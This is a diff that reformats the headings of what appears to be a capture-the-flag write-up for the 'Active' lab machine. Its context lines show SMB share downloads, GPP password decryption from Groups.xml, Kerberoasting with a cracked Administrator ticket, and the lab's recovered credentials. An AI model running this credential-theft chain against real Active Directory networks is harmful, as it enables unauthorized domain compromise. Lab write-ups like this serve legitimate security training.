@@ -4,7 +4,7 @@
 ```
 If Active Directory => [[Synchronize NTP]] with the domain controller.
 
-# Content
+### Content
 
 - SMB Enumeration
 - SMB Full share replication to local machine [[SMB Download]] `smbclient mget*`
@@ -12,7 +12,7 @@ If Active Directory => [[Synchronize NTP]] with the domain controller.
 - Kerberoasting
 - Hashcat TGS crack
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -101,7 +101,7 @@ smb: \> mget *
 ```
 We then check what info is within the share:
 ![[Pasted image 20230209005650.png]]
-# Exploitation
+### Exploitation
 This structure is very similar to the SYSVOL share so we know that there is a Groups.xml, this file can have a GPP hash that can be decrypted: ^959fa1
 ```bash
 cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
@@ -117,7 +117,7 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
 GPPstillStandingStrong2k18
 ```
 
-# Root privesc
+### Privilege Escalation
 Now, since we know that there is no port tcp-5985 to login directly open we can keep the enumeration on port tcp-445, the next share interesting is not SYSVOL but Users and this is its structure:
 ![[Pasted image 20230209010606.png]]
 After a deep enumeration, we couldn't identify any useful file that could provide a privesc or a lateral movement so we tried another approach which is a [[Kerberoasting (Service Account Attacks)]]. ^659f81
@@ -146,17 +146,17 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$
 ...
 f0cc1679087568696baa79fef670721b$0bd9f0addc75c15876fda2aae6fc4a9611250979c4e729c0b6d21a44160b71cc6:Ticketmaster1968
 ```
-# Credentials
+### Credentials
 ```bash
 svc_tgs:GPPstillStandingStrong2k18
 Administrator:Ticketmaster1968
 ```
 
-# Notes
+### Notes
 
 - We can extract a share with SMB directly by abusing of the [[SMB Download]] with SMBClient `mget *` functionality.
 
-# Resources:
+### References
 * None
 
 
